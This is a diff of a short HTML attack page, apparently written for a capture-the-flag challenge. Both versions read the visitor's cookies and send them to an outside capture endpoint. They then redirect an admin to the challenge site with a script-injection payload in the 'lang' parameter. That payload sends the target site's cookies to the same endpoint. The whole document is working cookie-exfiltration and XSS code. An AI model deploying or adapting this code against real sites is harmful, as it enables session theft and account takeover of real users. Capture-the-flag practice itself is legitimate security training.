@@ -1,25 +1,14 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Cookie Exfil & Redirect</title>
-</head>
 <body>
-  <h1>Preparing to redirect...</h1>
   <script>
-    // Exfil cookies from THIS static HTML (your domain)
-    if(document.cookie) {
-      fetch('https://ssrf-eta.vercel.app/api/capture?from=static&c=' + encodeURIComponent(document.cookie));
-    }
-
-    // XSS payload for the vulnerable challenge site
-    var xss = '";fetch("https://ssrf-eta.vercel.app/api/capture?from=target&c="+encodeURIComponent(document.cookie));//';
-    var target = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xss);
-
-    // Redirect admin to the challenge site with your XSS
-    setTimeout(() => {
-      window.location.replace(target);
-    }, 250); // slight delay to ensure exfil
+    var i = new Image();
+    i.src = 'https://ssrf-eta.vercel.app/api/capture?from=static&c='+encodeURIComponent(document.cookie);
+    setTimeout(function() {
+      var xss = '";fetch("https://ssrf-eta.vercel.app/api/capture?from=target&c="+encodeURIComponent(document.cookie));//';
+      var url = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xss);
+      window.location.replace(url);
+    }, 250);
   </script>
 </body>
 </html>
